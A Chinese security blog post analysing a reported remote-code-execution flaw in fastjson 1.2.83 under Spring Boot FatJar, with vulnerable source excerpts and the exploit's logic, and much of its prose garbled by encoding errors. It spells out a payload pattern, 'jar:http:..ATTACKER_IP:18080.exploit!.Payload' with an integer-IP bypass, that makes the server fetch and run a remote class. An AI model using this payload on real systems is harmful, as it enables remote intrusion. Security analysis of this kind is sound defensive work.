---
title: 2026年了，核弹还是fastjson，fastjson1.2.83 RCE是怎么回事？
url: https://lorexxar.cn/2026/07/21/fs1-2-83rce/
source: LoRexxar's Blog | 信息技术分享
date: 2026-07-21
fetch_date: 2026-07-22T05:02:40.037439
---

# 2026年了，核弹还是fastjson，fastjson1.2.83 RCE是怎么回事？



[LoRexxar's Blog | ä¿¡æ¯ææ¯åäº«](/)

[LoRexxar's Blog | ä¿¡æ¯ææ¯åäº«](/)

2026å¹´äºï¼æ ¸å¼¹è¿æ¯fastjsonï¼fastjson1.2.83 RCEæ¯æä¹åäºï¼



# 2026å¹´äºï¼æ ¸å¼¹è¿æ¯fastjsonï¼fastjson1.2.83 RCEæ¯æä¹åäºï¼

java
fastjson


2026/07/21




Share

* 
* 
* 
* 
* 

![](/assets/loading.svg)

7æ19æ¥ï¼æ¨ä¸çä¸åå®å¨ç ç©¶åå£°ç§°ï¼ä»åç°äºä¸ä¸ªå¨fastjson 1.2.83çæ¬ä¸­æ égadgetçRCEæ¼æ´ãä¸æ¶é´æ¿èµ·åå¸æµªã
![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607211830173.png)

Fastjsonè½ç¶å·²ç»åæ­¢ç»´æ¤1çæ¬ï¼ä½æ¯1çæ¬çFjä¾æ§æ¯äºèç½ä¸åºç¨æå¤çJava JSONåºä¹ä¸ï¼è½ç¶1.2.83æ²¡æå¨ç»´æ¤ï¼ä½æ¯å¨é¿æåfastjsonå¯¹æçæ¶é´éï¼83çæ¬ä»å¯ä»¥åºäºexpectClassåç¬¬ä¸æ¹åºææçgadgetåçæå¶æéçæ»å»å©ç¨ï¼å ä¹æ æ³RCEï¼æä»¥å¾å¤åå®¶æ²¡æéæ©æ´æ°å°FJ2å¢å ä¸ç¡®å®æ§ã

è½ç¶ä¸ç¡®å®è¿ä¸ªæ¼æ´æ¯å¦æ¥èªäºaiï¼**ä½æ¯å¨è¿å»ç1å¤©å¤æ¶é´åï¼åºäºä½èçé¨åä¿¡æ¯ï¼å¤§å®¶æ­£å¨éæ¸æ¢ç´¢æ¼æ´ççç¸**ãé£ä¹çç¸å°åºæ¯ä»ä¹ï¼

# å³äºæ¼æ´èµ·å§

å¨è¿ç¯æ¨ææ¿èµ·äºå¤ç½çè®¨è®ºä¹åï¼åä½èéæ¸å¬å¸äºä¸äºå³äºæ¼æ´çä¿¡æ¯

![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607211830803.png)

* è¯¥æ¼æ´å½±åfastjson 1.2.68 -> 1.2.83
* ä¸autoTypeæ å³ï¼åªæå¯ç¨SafeModeæèè¿ç§»å°Fastjosn 2.xæ¥è§£å³

![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607211830336.png)

![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607211830644.png)

* ä¸éè¦æå®expectClassï¼ä¸éè¦æ§å¶ç¬¬äºä¸ªåæ°ï¼ä¹ä¸æ¯èµ°æä»¬ä»¥å¾åºäºç½ååç±»çç»è¿éå¾

![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607211830190.png)

* è¿ä¸ªæ¼æ´è³å°å½±åäºèç½ä¸æå¸¸è§ç3ä¸ªçæ¬ï¼8ï¼17ï¼21

å¨è¿æ ·çåºç¡ä¸ï¼å¾å¤å®å¨ç ç©¶èå¼å¯äºAIæ¶ä»£æææçæ¨è¿åæï¼çç¸è¢«ä¸ç¹ç¹å¥å¼æ°´é¢

# æ½ä¸å¥è§

äºæç ´å±çç¬¬ä¸æ­¥å¾å¿«å°æ¥ï¼githubä¸æäººç´æ¥åäº«äºè¯¥æ¼æ´çpocï¼è¿ä¸ªpocå·²ç»404äºï¼ï¼ç±äºæå·²ç»æ²¡ææªå¾äºï¼çè³è¿ä¸ªpocçæ¨éä½èæ¯Codexï¼éå¸¸æç¬

* <https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC>

å¨è¿çæç« éæå°äºä¸ä¸ªå¾æè¶£çæ¹æ¡

**Fastjsonéè¿ Spring Boot FatJar ç LaunchedURLClassLoader æ¥è¿ç¨å è½½å¸¦æ`@JSONType`æ³¨è§£çç±»ï¼æç»è¿ç¨ä»£ç æ§è¡ãæ è®ºæ¯å¦å¼å¯autoTypeã**

![](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/202607211830211.png)

å¨ Spring Boot FatJar ç¯å¢ä¸­æ¶ï¼LaunchedURLClassLoader ä¼å°ç±»èµæºè·¯å¾è§£éä¸º jar:http:// URLï¼ä»èè§¦åè¿ç¨ HTTP è¯·æ±ä¸è½½æ¶æ JARï¼æç»å®ç°è¿ç¨ç±»å è½½åä»£ç æ§è¡ã

* é¤äºfastjsonï¼è¿è¦æ±æspringboot
* **åºç¨ä»¥ Spring Boot FatJar æ¹å¼è¿è¡ï¼ä½¿ç¨ LaunchedURLClassLoaderï¼**
* JDK çæ¬ä¸º 8

ä»¥ä¸æ¯Pocåæç»åºçä¾èµ

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ``` | ``` <properties>     <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>     <maven.compiler.source>1.8</maven.compiler.source>     <maven.compiler.target>1.8</maven.compiler.target>     <fastjson.version>1.2.83</fastjson.version>     <spring.boot.loader.version>2.7.18</spring.boot.loader.version>     <asm.version>9.6</asm.version> </properties>  <dependencies>     <dependency>         <groupId>com.alibaba</groupId>         <artifactId>fastjson</artifactId>         <version>${fastjson.version}</version>     </dependency>     <dependency>         <groupId>org.springframework.boot</groupId>         <artifactId>spring-boot-loader</artifactId>         <version>${spring.boot.loader.version}</version>     </dependency>     <dependency>         <groupId>org.ow2.asm</groupId>         <artifactId>asm</artifactId>         <version>${asm.version}</version>     </dependency> </dependencies> ``` |

æ¼æ´çå®éå©ç¨å¾ç®å

å¨ParserConfigä¸­ï¼æè¿æ ·ä¸æ®µä»£ç 

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` | ``` // ParserConfig.java ç¬¬ 1479-1503 è¡ boolean jsonType = false; InputStream is = null; try {     // å³é®ï¼æç±»åä¸­ç . æ¿æ¢æ /ï¼æ¼æèµæºè·¯å¾     String resource = typeName.replace('.', '/') + ".class";     if (defaultClassLoader != null) {         is = defaultClassLoader.getResourceAsStream(resource);  // â è¿ç¨å è½½ï¼     }     if (is != null) {         ClassReader classReader = new ClassReader(is, true);         TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);         classReader.accept(visitor);         jsonType = visitor.hasJsonType();  // æ£æµ @JSONType æ³¨è§£     } } catch (Exception e) { /* skip */ }  if (autoTypeSupport || jsonType || expectClassFlag) {  // â jsonType=true ç»è¿ç¬¬ä¸å±     clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); } ``` |

fastjsonä¼æè¯·æ±ä¸­ç`.`æ¿æ¢æ`/`ï¼ç¶åæ¼æ¥ä¸`.class`ä¹åå è½½ã

æ¬ææ¯æç±»ä¼¼äºæ­£å¸¸çåï¼è½¬ä¸ºè·¯å¾å è½½

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` @type = "com.example.MyModel"   â replace('.', '/') â "com/example/MyModel.class"   â getResourceAsStream â ä»æ¬å° classpath å è½½   â æ£æµ @JSONType â ä¿¡ä»»   â loadClass â æ­£å¸¸ä¸å¡ç±» ``` |

ä½æ¯è¿éå°±åºç°äºå ä¸ªåç¹

ç±äºè¯·æ±ä¸­ç`.`æ¿æ¢æ`/`ï¼é£ä¹å°±å¯ä»¥éè¿æé `.`æ¥ç»è¿æ­£å¸¸çéå¶

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` è¾å¥jar:http:..ATTACKER_IP:18080.exploit!.Payload å¶ä¸­http:..è½¬åä¸ºhttp:// å¶ä¸­ATTACKER_IP:18080.exploitè½¬åä¸ºATTACKER_IP:18080/exploit å¶ä¸­!.è½¬åä¸º!/  æåä¸ä¸ªé®é¢æ¯ipéç.ä¹ä¼è¢«è½¬ä¹ï¼é£ä¹æ´ç®åç´æ¥ç¨æ´å½¢ip 2130706433:18080 -> 127.0.0.1:18080 ``` |

æä»¥æåéè¿å·§å¦çæé å°±å¯ä»¥å®ç°è¿ç¨å è½½poc

ä¸ä¸ä¸ªpocç±3ä¸ªé¨åææ

**1ã`replace('.', '/')`çæå¤å¯¼è´äºå·§å¦çæå»ºï¼ç»è¿äºå¯¹äº/çéå¶ï¼ä¹ä¾§é¢ç»å¼äºå¯¹äºè¿ç¨å è½½çéå¶**

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` // ClassLoader.java private ProtectionDomain preDefineClass(String name, ProtectionDomain pd) {     ...     if (name.indexOf('/') != -1) {         throw new NoClassDefFoundError("IllegalName: " + name);     }     ... } ``` |

**2ãSpring Boot çç±»å è½½å¨è½è§£æ jar:http:// åµå¥ URLï¼è¿æ¯ Spring Boot FatJar å è½½åµå¥ JAR çæ­£å¸¸åè½ï¼**

**3ã`@JSONType æ³¨è§£`è¿ä¸ªè·¯å¾å¥å£æ²¡æè¢«é¢å¤éå¶ï¼åè®¸è¿ç¨å è½½**

è¿æ¡é¾è·¯è¿ç¨å è½½åæ¥çç±»è¢«defineClassåï¼éæåå§åå`<clinit>`ä¼ç«å³æ§è¡ï¼ä¸ä¼èµ°å°åç»­çç±»åç»å®ï¼æä»¥å¶ä»çéå¶ä¹æ æã

|  |  |
| --- | --- |
| ``` 1 ``` | ``` parseObject(body, Dto.class) çæä¹åçprobeé¶æ®µå°±æ§è¡ ``` |

ä½æ¯é®é¢æ¥è¸µèè³ï¼å¦æåæ¼æ´ä½¿ç¨äºè¿ä¸ªè·¯å¾ï¼é£ä¹å¨é«äºJDK8ççæ¬æè¿æ ·ä¸ä¸ªéå¶

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` Class<?> loadClassInLaunchedClassLoader(String name) {     String resource = name.replace('.', '/') + ".class";   // æå»ºèµæºè·¯å¾      InputStream is = getParent().getResourceAsStream(resource);   // ä¸è½½      byte[] bytes = readAll(is);     return defineClass(name, bytes, 0, bytes.length);  //æ ¡éªname } ``` |

å¨è¿ç¨å è½½æåä¹åï¼ç´§æ¥çdefineclassï¼ä¸åçæ¬çjdkä¼æä¸åçéå¶

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ``` | ``` defineClass(name, å­èç bytes)   â   ââ Javaå±: preDefineClass   â    checkName(nameåæ°)   â    â æ ¡éªçæ¯ ä¼ å¥çnameå­ç¬¦ä¸²   â    â ç¹å·å½¢å¼æ²¡æ/ï¼éè¿   â   ââ nativeå±: defineClass1 â parseClassFile        â        ââ ç¬¬ä¸è½®: æå­èç è§£ææå¸¸éæ± ç»æ        â    â æ­¤æ¶å¸¸éæ± éçç±»åæ¯å­èç åå§å¼       ...